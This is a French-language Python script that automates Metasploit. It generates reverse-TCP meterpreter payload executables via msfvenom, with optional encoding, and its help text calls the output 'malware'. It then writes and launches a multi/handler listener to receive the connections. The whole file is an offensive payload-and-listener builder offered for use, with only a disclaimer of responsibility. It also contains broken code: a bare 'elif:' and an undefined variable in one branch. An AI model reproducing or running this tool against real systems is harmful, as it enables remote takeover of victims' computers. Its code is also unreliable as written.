#coding:utf-8

#-----------------------------------------------------------------------------------#
# Coding by FzF_StormZ --> https://www.youtube.com/channel/UCFokPE7IzGVhwQeIBmja7ew #
#-----------------------------------------------------------------------------------#

import os
import time
from colorama import *






def help():
	'''
	Fonction permettant de donner les options possible du script
	'''
	print(Fore.RED + "[+] ------------------------------------------------------------------------------------------------------[+]")
	print(Fore.WHITE + "    Ce programme permet de genérer très facilement et configurer très facilement un payload et un listener")
	print(Fore.RED + "[+] ------------------------------------------------------------------------------------------------------[+]\n\n")
	print(Fore.CYAN + "-payload_name --> Choisir le nom du payload qui sera utilisé pour votre le malware\n-ip --> Choisir l'ip qui sera utilisé pour recevoir la connection de votre malware\n-port --> Choisir un port qui sera utilisé pour recevoir les paquets de votre malware\n-encoder --> Choisir l'encoder qui sera utilisé pour votre malware")






def menu():
	'''
	Fonction permettant d'afficher le menu de début du script
	'''
	regle = int(input(Fore.RED + "[WARNING] Je ne suis en aucun cas responsable de l'usage que vous allez faire de ce script !!\n\nTapez '1' si vous êtes conscient de vos actes.\nSinon tapez '2' pour quitter le script\n\n>"))
	if regle == 2:
		exit()
	else:
		print(Fore.BLUE + "-----------------------------------------------------------------------------------------------------")
		time.sleep(0.10)
		print(Fore.BLUE + "|                                                                                                   |")
		time.sleep(0.10) 
		print(Fore.BLUE + "| ███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗███████╗ |")
		time.sleep(0.10)
		print(Fore.BLUE + "| ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝╚══███╔╝ |")
		time.sleep(0.10)
		print(Fore.BLUE + "| ██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   █████╗    ███╔╝  |")
		time.sleep(0.10)
		print(Fore.BLUE + "| ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝   ███╔╝   |")
		time.sleep(0.10)
		print(Fore.BLUE + "| ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   ███████╗███████╗ |")
		time.sleep(0.10)
		print(Fore.BLUE + "| ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚══════╝ |")
		time.sleep(0.10)
		print(Fore.BLUE + "|                                                                                                   |")
		time.sleep(0.10)
		print(Fore.BLUE + "-------------------------------------[-] Coding by FzF_StormZ [-]------------------------------------\n\n")
		time.sleep(0.10)
		print(Fore.BLUE + "[+] -----------------------------------------------------------------------------------------------[+]")
		time.sleep(0.10)
		print(Fore.RED + "[-] ---------------------------------> 1. Genérer un payload <-------------------------------------[-]")
		time.sleep(0.10)
		print(Fore.RED + "[-] ---------------------------------> 2. Configurer un listener <---------------------------------[-]")
		time.sleep(0.10)
		print(Fore.RED + "[-] ---------------------------------> 3. Prochainement ... (in building) <---------------------------------[-]")
		time.sleep(0.10)
		print(Fore.BLUE + "[+] -----------------------------------------------------------------------------------------------[+]\n\n")
		time.sleep(0.10)
		choix = int(input(Fore.BLUE + "[INFO] Tapez 1, 2 ou 3: "))
	return choix






def recup_infos(choix):
	'''
	Fonction permettant de récupérer les informations que l'utilisateur veut utiliser pour son payload, son listener ou les deux
	'''
	while True:
		if choix == 1:
			ip = str(input("[+] IP (or DNS): "))
			payload_name = str(input("[+] PAYLOAD (windows/meterpreter/reverse_tcp): "))
			while True:
				try:
					port = int(input("[+] PORT (4444): "))
					break
				except ValueError as error:
					print("[!] {}: vous devez nous donnez un nombre".format(error))
			fichier = str(input("[+] FICHIER (payload.exe): "))
			get_encoder = int(input("[?] Voulez-vous assigner un type d'encodage à votre payload ?\n[1] Oui\n[2] Non\n>"))
			if get_encoder == 1:
				encoder = str(input("[+] ENCODER (x86/shikata_ga_nai): "))
				os.system("clear")
				time.sleep(1)
				get = payload(ip, payload_name, port, fichier, encoder=encoder)
				if get == 1 or get == "Oui":
					listener(payload_name, ip, port)
					break
				else:
					break
			elif get_encoder == 2 or get == "Non":
				get = payload(ip, payload_name, port, fichier)
				if get == 1:
					listener(payload_name, ip, port)
					break
				else:
					break
			else:
				print("[ERROR] Ce choix n'existe pas :/")
		elif choix == 2:
			print("[INFO] Nous allons devoir récupérer quelques informations pour pouvoir configurer et lancer un listener")
			time.sleep(1)
			ip = str(input("[+] IP (or DNS): "))
			payload_name = str(input("[+] PAYLOAD (windows/meterpreter/reverse_tcp): "))
			while True:
				try:
					port = int(input("[+] PORT (4444): "))
					break
				except ValueError as error:
					print("[!] {}: vous devez nous donnez un nombre".format(error))
			listener(payload_name, ip, port)
			break
		elif:
			print("[NEWS] Les nouveautés que je compte mettre:\n\n- Scanneur nmap via metasploit (avec logs)\n- Ajoutez plus d'options durant le génération du payload\n")
		else:
			print("[ERROR] Ce choix n'existe pas :/")
	print("\n\n[^^] Merci d'avoir utilisé mon script\n\n")






def payload(ip, payload_name, port, fichier, **kwargs):
	'''
	Fonction qui permet de genérer un payload metasploit (encoder ou non).
	'''
	if kwargs != {}:
		encoder = kwargs["encoder"]
		print("Voici les options que vous avez rentré:\n\n[IP] >{}\n\n[PAYLOAD] >{}\n\n[PORT] >{}\n\n[ENCODER] >{}\n\n[FICHIER] >{}\n\n".format(ip, payload_name, port, encoder, fichier))
		time.sleep(2)
		os.system("clear")
		os.system("msfvenom -p {} lhost={} lport={} -e {} > {}".format(payload_name, ip, port, encoder, fichier))
		time.sleep(5)
		os.system("clear")
		print("[INFO] Votre fichier a été généré à l'endroit où vous avez lancé le script !!")
		time.sleep(1)
		choix_rc = int(input("[?] Voulez-vous lancer le listener dès maintenant ?\n[1] Oui\n[2] Non\n>"))
		return choix_rc

	else:
		print("Voici les options que vous avez rentré:\n\n[IP] >{}\n\n[PAYLOAD] >{}\n\n[PORT] >{}\n\n[FICHIER] >{}".format(ip, payload_name, port, fichier))
		time.sleep(2)
		os.system("clear")
		os.system("msfvenom -p {} lhost={} lport={} > {}".format(payload_name, ip, port, fichier))
		time.sleep(5)
		os.system("clear")
		print("[INFO] Votre fichier a été généré à l'endroit où vous avez lancé le script !!")
		time.sleep(1)
		choix_rc = int(input("[?] Voulez-vous lancer le listener dès maintenant ?\n[1] Oui\n[2] Non\n>"))
		return choix_rc






def listener(payload_name, ip, port):
	'''
	Fonction permettant de créer et lancer un listener grâce à un fichier .rc
	'''
	with open("meterpreter.rc", "a") as fichier:
		fichier.write("\nuse multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j".format(payload_name, ip, port))
	print("[INFO] Fichier .rc vient d'être crée en fonction de vos choix")
	time.sleep(1)
	print("[INFO] Lancement de ce fichier dans metasploit ...")
	time.sleep(1)
	os.system("clear")
	os.system("msfconsole -r meterpreter.rc")





### PROGRAMME PRINCIPAL ###

choix = menu()
recup_infos(choix)